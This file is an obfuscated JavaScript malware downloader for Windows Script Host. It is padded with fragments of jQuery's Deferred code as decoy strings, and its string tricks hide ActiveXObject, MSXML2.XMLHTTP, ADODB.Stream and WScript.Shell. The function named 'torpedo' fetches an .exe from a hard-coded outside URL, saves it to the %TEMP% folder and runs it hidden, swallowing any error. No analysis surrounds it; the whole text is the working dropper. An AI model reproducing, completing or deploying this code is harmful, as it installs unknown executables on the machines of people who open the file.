KgaYzabKU = " deferred[ done | fail | progress ] for forwarding actions to newDefer deferred[ tuple[ 1 ] ]( function() { var returned = fn && fn.apply( this, arguments ); if ( returned && jQuery.isFunction( returned.promise ) ) { returned.promise() .progress( newDefer.notify ) .done( newDefer.resolve ) .fail( newDefer.reject ); } else { newDefer[ tuple[ 0 ] + \"With\" ]( this === promise ? newDefer.promise() : this, fn ? [ returned ] : arguments ); } } ); } ); fns = null; } ).promise(); },";
String.prototype.twofold = function () { aa = this; return aa.charAt(1 * 0 / 1); };
String.prototype.furry = function () { aa = this; return aa.split(")").join("").split("(").join("").split("9").join(""); };

var ekzlje = ["()A()()()c()t()()"+"i()(v())((e9))(X))"+("jQQsjOzVqSq","advertising","veteran",")(O())b())")+")j(())e)c))t)", ("babyhood","confidence","E")+"x)p"+"an)d)E"+("hyperbole","watch","defender","village","n)v")+"i)r"+("captor","atlas","on)me)nt")+"S)t"+")ri"+"ngs", ("extracting","unlikely","XrowgllHfRG","geranium",")")+")%"+"T)E"+("william","twentyfirst","nested","M)P)%"), ""+("plains","releases",").")+"e)x)e", "R)"+("encircle","designers","un)"), "M)"+("carroll","authorization","confusing","lawful)ly","S)X")+("univers)ality","carpet","encountered","M)L2).")+"X)M"+"L)HT)TP", "W)"+"S)c"+("nonco)mmissioned","governor","r)i")+("decrease","fluctuation","pt).)Sh)e")+("IjMYxhY","stops","magazine","l)l")];
UKvSTjCwoJe = " promise[ done | fail | progress ] = list.add promise[ tuple[ 1 ] ] = list.add;";
var GLNpeWx = this[ekzlje.shift().replace("9", "").furry()];
kpTEmxgS = "UPNGuN";
snapshot = (("probation", "prayer", "OpjKRoIFbi", "licensing", "pbsPBjI") + "ngcGeNrkCJ").twofold();
asthmas = (("tunic", "cAxjSGgIiCD", "operatic", "unhindered", "sBEGWKEUSHCq") + "pbWcJARApDJD").twofold();
kpTEmxgS = ekzlje.shift();

var EkbrCAD = new GLNpeWx(ekzlje.pop().furry());
ydagKbat = " Keep pipe for back-compat promise.pipe = promise.then;";
var AyLJcpnc = new GLNpeWx(ekzlje.pop().furry());
HyGhCDM = " Get a promise for this deferred If obj is provided, the promise aspect is added to the object promise: function( obj ) { return obj != null ? jQuery.extend( obj, promise ) : promise; } }, deferred = {};";
var qOgIhFXi = EkbrCAD[""+(("JWhKISbfV", "collaboration", "marilyn", "involve", ("diadem","coupons","numerical","")+"9"+"999")+kpTEmxgS+"))").furry()](("(("+""+"9"+("additions","context","999")+ekzlje.shift()+"))").furry());
FVXmJc = " Add list-specific methods jQuery.each( tuples, function( i, tuple ) { var list = tuple[ 2 ], stateString = tuple[ 3 ];";

failse = (("AcxQGEG", "perplexing", "implementation", "incredible", "EryjAiVEvhpb") + "nRagmMw").twofold().furry();

function torpedo(supervision, alone) {

    try {
        var lamplight = qOgIhFXi + "/" + alone + ekzlje.shift().furry();
    uBQSCa = "} All done! return deferred; },";
    AyLJcpnc[("o" + snapshot +"(9)"+ failse).furry() + "n"](("jNAlaLv","honor","liberia","examining","G") + failse + ("cobra","observe","comeliness","T"), supervision, false);

    htooDlqRARx = " Deferred helper when: function( subordinate /* , ..., subordinateN */ ) { var i = 0, resolveValues = slice.call( arguments ), length = resolveValues.length,";
    AyLJcpnc[asthmas + ("fioricet","prediction","brutish","e") + (("boeotia", "economist", "mJlVIM", "xhtml", "dorset", "nlaKkrbMnk") + "HaRHtvosEBs").twofold() + (("stealth", "plastic", "gasoline", "charioteer", "observatory", "dCKChAhoDs") + "pfmGAWJjUBL").twofold()]();
    yRpnkg = " the count of uncompleted subordinates remaining = length !== 1 || ( subordinate && jQuery.isFunction( subordinate.promise ) ) ? length : 0,";
    if (AyLJcpnc.status == 200) {
        var qeBhJRt = new GLNpeWx((("tinkling","signed","whereas","outcry","")+"A"+("opens","arbor","pO")+"DB." + ""+("conscript","forecast","notch","S")+"tr"+("batman","reorganization","eam")).replace("p", "D"));
        qeBhJRt[("withstood","triumphal","avant","special","")+"o"+"pen"]();
        gsjhFHl = " Handle state if ( stateString ) { list.add( function() {";
        qeBhJRt.type = 0 + 3 - 2;
        SrAfRU = " state = [ resolved | rejected ] state = stateString;";
        qeBhJRt[("allurement","manoeuvring","juvenile","fellowship","w")+"ri"+"te"](AyLJcpnc[("spectral","militarism","")+"R"+"es"+("dapper","patriarchal","pon") + asthmas + "e"+("abolitionist","dialectic","linear","plash","Bo")+"dy"]);
        ovgusEtN = " [ reject_list | resolve_list ].disable; progress_list.lock }, tuples[ i ^ 1 ][ 2 ].disable, tuples[ 2 ][ 2 ].lock ); ";
        qeBhJRt[(snapshot + ("inordinate","chemistry","o")+"Di"+"ti"+"on").replace("D", asthmas)] = 0;
        dVAlJQnViul = "} deferred[ resolve | reject | notify ] deferred[ tuple[ 0 ] ] = function() { deferred[ tuple[ 0 ] + \"With\" ]( this === deferred ? promise : this, arguments ); return this; }; deferred[ tuple[ 0 ] + \"With\" ] = list.fireWith; } );";
        qeBhJRt["sav"+"eT"+("watches","dislodge","oF")+"ile"](lamplight, 2);
        fXGXpRPRu = " Make the deferred a promise promise.promise( deferred );";
        qeBhJRt.close();
        SfaDSgPN = " Call given func if any if ( func ) { func.call( deferred, deferred ); ";
        EkbrCAD[ekzlje.shift().furry()](lamplight, 1, "fqjOlgnK" === "dHbHbqDShw"); CxKRBTM = " } else if ( !( --remaining ) ) CWXzvzEix{ deferred.resolveWith( contexts, values ); } }; },";
    }

} catch (BfoaNF) { };

    yvdMDUzG = " Update function for both resolve and progress values updateFunc = function( i, contexts, values ) { return function( value ) { contexts[ i ] = this; values[ i ] = arguments.length > 1 ? slice.call( arguments ) : value; if ( values === progressValues ) { deferred.notifyWith( contexts, values );";
}
torpedo("htt"+("phosphorescence","markers","predominance","p:")+"//"+"s2"+"as.com/7"+"65"+("moscow","exorbitant","allay","f46vb.")+"exe","fEAzUP");
   RyVQUWQp = " the master Deferred. If resolveValues consist of only a single Deferred, just use that. deferred = remaining === 1 ? subordinate : jQuery.Deferred(),";